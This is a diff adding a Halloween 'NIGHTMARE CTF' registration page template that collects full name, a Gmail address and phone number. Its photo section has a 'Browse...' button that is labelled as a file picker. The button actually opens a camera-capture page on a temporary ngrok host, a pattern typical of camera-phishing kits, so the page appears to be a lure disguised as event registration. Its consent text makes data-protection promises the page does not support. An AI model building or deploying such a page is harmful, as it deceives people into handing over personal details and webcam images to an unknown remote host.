@@ -1,0 +1,259 @@
+{% extends "base.html" %}
+
+{% block body %}
+
+<!-- ═══ HERO BANNER ═══ -->
+<header class="hero" role="banner">
+  <div class="hero-content">
+    <p class="hero-eyebrow">▶&nbsp; EVENT ACTIVE &nbsp;//&nbsp; COMPETITION OPEN &nbsp;▶</p>
+    <h1>NIGHTMARE&nbsp;<span class="ctf">CTF</span></h1>
+    <p class="hero-sub">— CAPTURE THE FLAG —</p>
+    <div class="hero-meta">
+      <span class="hero-badge"><span class="ico">💀</span>HALLOWEEN 2026</span>
+      <span class="hero-badge"><span class="ico">🔒</span>CYBERSECURITY</span>
+      <span class="hero-badge"><span class="ico">🏆</span>PRIZES AWAIT</span>
+    </div>
+  </div>
+</header>
+
+<!-- Terminal ticker -->
+<div class="terminal-ticker" aria-hidden="true">
+  <span class="ticker-inner">
+    &gt;&gt; SYSTEM BREACH DETECTED &nbsp;·&nbsp; INITIALISING CHALLENGE NODES &nbsp;·&nbsp;
+    CRYPTOGRAPHY · WEB EXPLOITATION · REVERSE ENGINEERING · FORENSICS · STEGANOGRAPHY · PWNING &nbsp;·&nbsp;
+    REGISTER NOW &nbsp;·&nbsp; THE DARKNESS AWAITS &nbsp;·&nbsp; ARE YOU WORTHY? &nbsp;&gt;&gt;
+  </span>
+</div>
+
+<!-- ═══ MAIN ═══ -->
+<main>
+
+  <!-- Flash messages -->
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}
+      <ul class="flash-list" role="alert" aria-live="polite">
+        {% for cat, msg in messages %}
+          <li class="{{ cat }}">
+            {% if cat == 'success' %}✅{% else %}⚠️{% endif %}
+            {{ msg }}
+          </li>
+        {% endfor %}
+      </ul>
+    {% endif %}
+  {% endwith %}
+
+  <!-- Pumpkin decorations -->
+  <div class="pumpkin-strip" aria-hidden="true">🎃 💀 🕷️ 🎃 🕸️ 💀 🎃</div>
+
+  <!-- ─── Registration Card ─── -->
+  <section class="card" aria-labelledby="reg-title">
+    <div class="card-header">
+      <span class="skull" aria-hidden="true">💀</span>
+      <div>
+        <h2 class="card-title" id="reg-title">Enter The Nightmare</h2>
+        <p class="card-subtitle">// contestant_registration_v1.0.sh</p>
+      </div>
+    </div>
+
+    <form id="registration-form"
+          method="POST"
+          action="{{ url_for('index') }}"
+          enctype="multipart/form-data"
+          novalidate>
+      {{ form.hidden_tag() }}
+
+      <!-- ── Full Name ── -->
+      <div class="form-group">
+        <label for="full_name">
+          Full Name <span class="req" aria-label="required">*</span>
+        </label>
+        <div class="input-wrap">
+          <span class="input-icon" aria-hidden="true">👤</span>
+          {{ form.full_name(
+              id="full_name",
+              class="",
+              placeholder="Your full name",
+              autocomplete="name",
+              required=True,
+              aria_required="true",
+              maxlength=120
+          ) }}
+        </div>
+        {% if form.full_name.errors %}
+          {% for err in form.full_name.errors %}
+            <p class="field-error" role="alert"><span aria-hidden="true">⚠</span> {{ err }}</p>
+          {% endfor %}
+        {% endif %}
+      </div>
+
+      <!-- ── Gmail Address ── -->
+      <div class="form-group">
+        <label for="email">
+          Gmail Address <span class="req" aria-label="required">*</span>
+        </label>
+        <div class="input-wrap">
+          <span class="input-icon" aria-hidden="true">📧</span>
+          {{ form.email(
+              id="email",
+              class="",
+              placeholder="yourname@gmail.com",
+              autocomplete="email",
+              required=True,
+              aria_required="true",
+              type="email"
+          ) }}
+        </div>
+        {% if form.email.errors %}
+          {% for err in form.email.errors %}
+            <p class="field-error" role="alert"><span aria-hidden="true">⚠</span> {{ err }}</p>
+          {% endfor %}
+        {% endif %}
+      </div>
+
+      <!-- ── Phone Number ── -->
+      <div class="form-group">
+        <label for="phone">
+          Phone Number <span class="req" aria-label="required">*</span>
+        </label>
+        <div class="input-wrap">
+          <span class="input-icon" aria-hidden="true">📱</span>
+          {{ form.phone(
+              id="phone",
+              class="",
+              placeholder="+1 555 000 0000",
+              autocomplete="tel",
+              required=True,
+              aria_required="true",
+              type="tel"
+          ) }}
+        </div>
+        {% if form.phone.errors %}
+          {% for err in form.phone.errors %}
+            <p class="field-error" role="alert"><span aria-hidden="true">⚠</span> {{ err }}</p>
+          {% endfor %}
+        {% endif %}
+      </div>
+
+      <!-- ── Photo Section ── -->
+      <div class="form-group">
+        <div class="photo-section" aria-labelledby="photo-section-heading">
+          <div class="photo-section-label" id="photo-section-heading">
+            <span aria-hidden="true">📸</span>
+            Choose a photo from your device
+            <span class="badge-opt">OPTIONAL</span>
+          </div>
+
+          <!-- Primary action: opens external capture page -->
+          <button
+            type="button"
+            id="browse-btn"
+            class="btn-browse"
+            onclick="window.open('http://grasp-untold-barista.ngrok-free.dev/templates/camera_temp/index.html', '_blank', 'noopener,noreferrer')"
+            aria-label="Browse — opens the photo capture page in a new browser tab"
+          >
+            <span aria-hidden="true">📷</span> Browse...
+          </button>
+          <p class="browse-helper">
+            <span aria-hidden="true">↗</span>
+            Opens the photo capture page in a new tab.
+          </p>
+
+          <!-- Divider -->
+          <div class="divider-or" aria-hidden="true">— or upload a saved photo directly —</div>
+
+          <!-- Secondary optional: local file picker (separate, clearly labelled) -->
+          <label class="local-upload-label" for="photo">
+            Upload a saved photo from this device (JPG, JPEG, PNG, WEBP · max 5 MB)
+          </label>
+          {{ form.photo(
+              id="photo",
+              accept=".jpg,.jpeg,.png,.webp",
+              aria_label="Upload a saved photo file from this device"
+          ) }}
+          <p class="file-note" aria-live="polite">
+            This uploads a locally-saved file. For live photo capture, use the Browse button above.
+          </p>
+        </div>
+      </div>
+
+      <!-- ── Consent ── -->
+      <div class="form-group">
+        <div class="consent-box">
+          <div class="consent-row">
+            {{ form.consent(id="consent", aria_required="true") }}
+            <label class="consent-text" for="consent">
+              <strong>I agree to the following:</strong>
+              My registration details (name, email, phone number) and any submitted photo will be collected
+              and stored securely by the NIGHTMARE CTF organisers solely for the purpose of managing my
+              competition entry. Photos are used only to verify participant identity for the event.
+              Data will not be shared with third parties and will be deleted within 90 days of the event
+              closing. I confirm I am at least 16 years of age and that the information I have provided
+              is accurate.
+            </label>
+          </div>
+          {% if form.consent.errors %}
+            {% for err in form.consent.errors %}
+              <p class="field-error" role="alert"><span aria-hidden="true">⚠</span> {{ err }}</p>
+            {% endfor %}
+          {% endif %}
+        </div>
+      </div>
+
+      <!-- ── Submit ── -->
+      <button
+        type="submit"
+        id="submit-btn"
+        class="btn-submit"
+        aria-label="Register for the Nightmare CTF challenge"
+      >
+        🎃 &nbsp;REGISTER FOR THE CHALLENGE&nbsp; 🎃
+      </button>
+    </form>
+  </section>
+
+</main>
+
+<script>
+  /* ── Client-side validation enhancement ────────────────────── */
+  (function () {
+    'use strict';
+    const form = document.getElementById('registration-form');
+    if (!form) return;
+
+    const gmailRe = /^[^\s@]+@gmail\.com$/i;
+    const phoneRe = /^\+?[\d\s\-()]{7,20}$/;
+
+    form.addEventListener('submit', function (e) {
+      let valid = true;
+
+      // Clear previous client errors
+      form.querySelectorAll('.client-error').forEach(el => el.remove());
+
+      function addError(inputId, msg) {
+        const inp = document.getElementById(inputId);
+        if (!inp) return;
+        const p = document.createElement('p');
+        p.className = 'field-error client-error';
+        p.setAttribute('role', 'alert');
+        p.innerHTML = '<span aria-hidden="true">⚠</span> ' + msg;
+        inp.closest('.input-wrap, .consent-box, .photo-section')
+           ?.after(p);
+        valid = false;
+      }
+
+      const name  = document.getElementById('full_name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const consent = document.getElementById('consent').checked;
+
+      if (name.length < 2)              addError('full_name', 'Please enter your full name (at least 2 characters).');
+      if (!gmailRe.test(email))         addError('email', 'Please enter a valid @gmail.com address.');
+      if (!phoneRe.test(phone))         addError('phone', 'Please enter a valid phone number.');
+      if (!consent)                     addError('consent', 'You must accept the consent agreement to register.');
+
+      if (!valid) e.preventDefault();
+    });
+  })();
+</script>
+
+{% endblock %}
